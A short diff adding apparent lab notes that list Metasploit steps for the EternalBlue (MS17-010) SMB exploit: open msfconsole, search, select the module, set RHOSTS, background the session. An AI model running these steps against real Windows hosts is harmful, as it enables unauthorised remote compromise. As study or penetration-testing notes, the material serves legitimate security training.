@@ -1,0 +1,7 @@
+1) msfconsole
+2) search ms17-010
+- copy and paste the correct exploit
+- exploit/windows/smb/ms17_010_eternalblue
+3) show options
+- RHOSTS
+4) ctrl z
